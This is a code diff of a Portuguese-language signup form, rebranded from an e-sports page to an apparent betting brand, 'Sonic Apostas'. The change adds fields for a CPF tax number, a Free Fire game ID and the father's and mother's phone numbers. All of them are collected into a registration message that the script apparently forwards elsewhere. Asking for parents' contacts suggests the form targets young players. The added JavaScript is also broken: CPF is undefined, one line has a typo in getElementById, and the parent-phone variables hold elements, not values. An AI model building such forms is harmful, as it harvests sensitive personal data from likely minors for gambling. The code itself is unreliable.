@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Cadastro - França E-Sports</title>
+<title>Registros - Sonic Apostas</title>
 
 <style>
 body {
@@ -65,7 +65,7 @@ button:hover {
 <body>
 
 <div class="container">
-  <h2>Cadastro - França E-Sports</h2>
+  <h2>Registro - Sonic Apostas</h2>
 
   <form id="form">
 
@@ -82,14 +82,26 @@ button:hover {
     </div>
 
     <div class="input-group">
-      <input type="text" id="gameid" placeholder="ID do jogo" required>
+      <input type="number" id="CPF" placeholder="CPF" required>
     </div>
 
     <div class="input-group">
-      <input type="text" id="telefone" placeholder="Número de telefone" required>
+      <input type="number" id="gameid" placeholder="ID do Free Fire" required>
     </div>
 
-    <button type="submit">Cadastrar</button>
+    <div class="input-group">
+      <input type="text" id="telefone" placeholder="Número de telefone principal" required>
+    </div>
+
+    <div class="input-group">
+      <input type="number" id="telefoneone" placeholder="Número do Pai">
+    </div>
+
+    <div class="input-group">
+      <input type="number" id="telefonetwo" placeholder="Número da Mãe">
+    </div>
+
+    <button type="submit">Registrar</button>
 
   </form>
 </div>
@@ -103,15 +115,20 @@ document.getElementById("form").addEventListener("submit", async function(e){
   const email = document.getElementById("email").value;
   const gameid = document.getElementById("gameid").value;
   const telefone = document.getElementById("telefone").value;
+  const telefoneone = document.getElementById("telefoneone")
+  const telefonetwo = document.getElementNyId("telefonetwo")
 
   let mensagem = `
 📩 NOVO CADASTRO
 
 👤 ADM: ${adm}
 🎮 Discord: ${discord}
+🔢 CPF: ${CPF}
 📧 Email: ${email}
 🆔 ID do jogo: ${gameid}
 📱 Telefone: ${telefone}
+📱 Telefone Da Pai: ${telefoneone}
+📱 Telefone Da Mãe: ${telefonetwo}
 `;
 
   try {
